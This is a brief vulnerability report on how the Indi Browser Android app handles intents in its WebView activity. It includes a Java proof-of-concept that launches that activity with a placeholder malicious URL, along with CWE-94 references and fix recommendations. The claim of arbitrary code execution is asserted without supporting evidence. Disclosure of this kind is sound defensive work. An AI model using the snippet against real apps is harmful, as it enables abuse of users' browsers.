
# Vulnerability Report

## Introduction
This report outlines a  security vulnerability in the Indi Browser (com.gurry.kvbrowser) app & how the app handles intent data.

## Affected Component
- **Activity**: `com.example.gurry.kvbrowser.webview` | https://play.google.com/store/apps/details?id=com.gurry.kvbrowser
- **App**: `com.gurry.kvbrowser`
- **Version**: `v.2.11.23 (102)`

## Vulnerability Description
The `com.example.gurry.kvbrowser.webview` of the `com.gurry.kvbrowser` app processes intents without properly validting data origin.


```markdown

## Proof of Concept

```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("https://maliciouswebsite.com"));
intent.setComponent(new ComponentName("com.gurry.kvbrowser", "com.example.gurry.kvbrowser.webview"));
startActivity(intent);
```


Malicious apps can target `com.example.gurry.kvbrowser.webview` with harmful URLs using the above code snippet.

## Potential Code Vulnerabilities
- **URL Validation**: Inadequate validation of incoming URLs.

## Impact
- Potential for arbitrary code execution through malicious URLs.


## MITRE CWE References
- [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)


## Recommendations
1. **Enhance URL Validation**: Implement rigorous validation for all URL schemes.
2. **Secure WebView Configuration**: Focus on WebView settings in older Android versions. Disable settings like `allowFileAccessFromFileURLs`.

